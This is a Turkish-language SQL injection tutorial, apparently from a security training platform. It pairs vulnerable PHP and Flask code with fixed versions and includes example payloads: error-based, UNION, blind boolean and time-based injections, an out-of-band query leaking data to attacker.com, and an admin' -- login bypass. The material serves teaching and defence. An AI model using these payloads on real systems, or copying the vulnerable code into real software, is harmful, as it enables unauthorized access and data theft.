SQL Injection, bir saldırganın zararlı SQL komutlarını, bir uygulamanın veritabanına gönderdiği sql sorgularına ekleyerek veritabanını manipüle ettiği bir saldırı türüdür. Bu saldırılar, veritabanındaki verilere izinsiz erişim sağlayabilir, verileri değiştirebilir veya silebilir ve sistemlere zarar verebilir.

![](https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/6175aca0-4290-44eb-adcd-824f6b7e4265/sql-injection-ea821667b.webp)

### SQL Injection Zafiyetine Sebep Olan Durumlar

SQL Injection zafiyetleri, web uygulamalarında sıklıkla rastlanan güvenlik açıklarından biridir ve genellikle kötü programlama uygulamaları sonucunda meydana gelir. Bu bölümde, SQL Injection zafiyetlerine neden olan temel durumları inceleyelim.

Dinamik Sorgu Yapılandırması

SQL Injection zafiyetlerinin en yaygın sebeplerinden biri, kullanıcı girdilerinin kontrolsüz bir şekilde SQL sorgularına dahil edilmesidir.

**Zafiyetli Kod**

```auto
$username = $_GET['username'];
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $query);
```

**Zafiyet Giderilmiş Kod**

```auto
$username = $_GET['username'];
$stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$result = $stmt->get_result();
```

Yetersiz Girdi Doğrulaması

Güvenli olmayan girdi doğrulaması veya girdi temizleme işlemleri de SQL Injection zafiyetlerine yol açabilir. Uygulamalar, kullanıcı girdilerini doğru şekilde doğrulamalı ve temizlemelidir.

**Zafiyetli Kod**

```auto
$username = $_GET['username'];
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $query);
```

**Zafiyet Giderilmiş Kod**

```auto
$username = $_GET['username'];
if (preg_match('/^[a-zA-Z0-9_]{1,15}$/', $username)) {
    $stmt = $conn->prepare("SELECT * FROM users WHERE username = ?");
    $stmt->bind_param("s", $username);
    $stmt->execute();
    $result = $stmt->get_result();
} else {
    echo "Invalid username.";
}
```

Hata Mesajlarının Açık Olması

SQL hata mesajlarının kullanıcıya açık bir şekilde gösterilmesi, saldırganların veritabanı yapısını çözümlemesine olanak tanır. Saldırganlar bu bilgileri, daha sofistike saldırılar için kullanılabilir.

**Zafiyetli Kod**

```auto
$result = mysqli_query($conn, $query);
if (!$result) {
    die("SQL error: " . mysqli_error($conn));
}
```

**Zafiyet Giderilmiş Kod**

```auto
$result = mysqli_query($conn, $query);
if (!$result) {
    error_log("SQL error: " . mysqli_error($conn)); // Log the error
    die("An error occurred. Please try again later.");
}
```

### SQL Injection Türleri

![](https://storage.hackviser.com/file/hackviser-prod/trainings/sections/images/6175aca0-4290-44eb-adcd-824f6b7e4265/sql-injection-types-30f6f8139.webp)

In-Band

In-Band SQL Injection, saldırganın verileri aynı kanal üzerinden hem gönderip hem alabildiği durumlardır. Bu tür, genellikle bilgi sızdırmak için kullanılan en yaygın yoldur.

**1. Error Based SQL Injection**

Bu teknik, uygulamanın veritabanından hata mesajları göstermesini tetikleyerek veritabanı yapısını öğrenmeye dayanır. Saldırgan, sorguda bilinçli hatalar yaparak hata mesajlarından yararlanır.

**SQL Injection Payloadı İçeren Örnek SQL Sorgusu**

```auto
SELECT * FROM users WHERE id = 1' AND extractvalue(rand(),concat(0x3a,(SELECT @@version)));
```

**2. Union Based SQL Injection**

Union

operatörü kullanılarak gerçekleştirilen bir saldırıdır. Saldırgan, orijinal sorguya

UNION

anahtar kelimesi ile ek sorgular ekleyerek ekstra veri çekmeyi amaçlar.

**SQL Injection Payloadı İçeren Örnek SQL Sorgusu**

```auto
SELECT username, password FROM users WHERE id = 1 UNION SELECT credit_card, pin FROM customers;
```

Out of Band

Bu tür SQL Injection, verilerin başka bir kanal veya protokol kullanılarak alındığı durumlardır. Genellikle DNS veya HTTP istekleri üzerinden veri sızdırılmasını içerir.

**SQL Injection Payloadı İçeren Örnek SQL Sorgusu**

```auto
SELECT load_file(concat('\\\\', (SELECT @@version), '.attacker.com\\abc'));
```

Bu payload, veritabanı sürüm bilgisini bir DNS sorgusu ile saldırganın kontrol ettiği bir sunucuya sızdırmayı dener.

Blind

Blind SQL Injection, veritabanı yapısı veya veriler hakkında doğrudan bilgi alınamadığında kullanılır.

**1. Boolean Based**

Sorgunun doğru veya yanlış dönmesine bağlı olarak veri çıkarılabilir. Saldırgan, koşullu sorgular göndererek uygulama cevaplarından yola çıkarak veritabanı içeriğini tahmin eder.

**SQL Injection Payloadı İçeren Örnek SQL Sorgusu**

```auto
SELECT * FROM users WHERE username = 'admin' AND substring(password,1,1) = 'a';
```

Bu sorgu, admin kullanıcısının şifresinin ilk harfinin 'a' olup olmadığını kontrol eder.

**2. Time Based**

Sorgu sonucuna bağlı olarak bir zaman gecikmesi oluşturularak çalışır. Sorgunun doğru olduğu durumlarda, belirli bir zaman gecikmesi meydana gelir.

**SQL Injection Payloadı İçeren Örnek SQL Sorgusu**

```auto
SELECT * FROM users WHERE username = 'admin' AND IF(1=1, sleep(10), false);
```

Bu sorgu, koşul doğru olduğunda veritabanını 10 saniye bekletir. Yanıtın gecikmesi, sorgunun doğru olduğunu gösterir.

### Login Bypass

SQL Injection, basit bir güvenlik zafiyeti olmasına rağmen, kötü niyetli kullanıcıların uygulamalar üzerinde ciddi zararlar verebileceğini gösteren güçlü bir örnektir. Bu örnekte, Python ile geliştirilmiş olan bir login panelinde SQL Injection ile nasıl oturum açılabileceğini adım adım inceleyelim.

Diyelim ki basit bir web uygulamasında kullanıcı adı ve şifre ile giriş yapılabilen bir login panelimiz var. Bu login panelinin arka planında çalışan Python kodu, kullanıcı girdilerini doğrudan SQL sorgusuna ekliyor. Bu da, SQL Injection zafiyetine neden oluyor.

Örnek Uygulama Kodu

Aşağıdaki Python script'i, Flask gibi bir web framework kullanılarak basit bir login işlemi için yazılmıştır.

```auto
from flask import Flask, request, render_template_string
import sqlite3

app = Flask(__name__)

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = ''
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        
        conn = sqlite3.connect('database.db')
        cursor = conn.cursor()
        
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
        cursor.execute(query)
        result = cursor.fetchone()
        
        if result:
            return "Welcome, " + result[1]  # result[1] is the username
        else:
            error = 'Invalid credentials'
    return render_template_string('<form method="post">Username: <input name="username" type="text"><br>Password: <input name="password" type="text"><br><input type="submit" value="Login"></form>{{ error }}', error=error)

if __name__ == '__main__':
    app.run(debug=True)
```

Bu kodda, kullanıcı adı ve şifre doğrudan SQL sorgusuna ekleniyor (

query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"

), bu da SQL Injection'a açık bir durum yaratıyor.

Kullanıcının normalde şifreyle giriş yapması gereken bu sisteme, SQL Injection kullanarak şifre bilgisine sahip olmadan giriş yapabiliriz. Kullanıcı adı alanına aşağıdaki gibi bir değer girilerek bu yapılabilir.

**Paylod:**

admin' --

Kullanıcı adı alanı için gönderilen bu payload python kodundaki SQL sorgusunu şu hale çevirir:

```auto
SELECT * FROM users WHERE username='admin' --' AND password=''
```

Burada

--

işareti, SQL'de yorum başlatmak için kullanılır ve sorgunun geri kalan kısmını etkisiz hale getirir. Bu durumda, şifre kontrolü yapılmadan sadece kullanıcı adına bakılır ve eğer

admin

kullanıcısı varsa, doğrudan sisteme giriş yapılır.

Güvenlik Önerisi

Bu tür zafiyetleri önlemek için, uygulamaların girdi doğrulaması yapması ve SQL sorgularını parametreleştirilmiş sorgular kullanarak oluşturması gerekir. Python'da bu, SQLite3 kütüphanesiyle şu şekilde yapılabilir:

```auto
query = "SELECT * FROM users WHERE username=? AND password=?"
cursor.execute(query, (username, password))
```

Bu yöntem, girdilerin doğrudan sorguya eklenmesini engeller ve SQL Injection saldırılarını büyük ölçüde önler.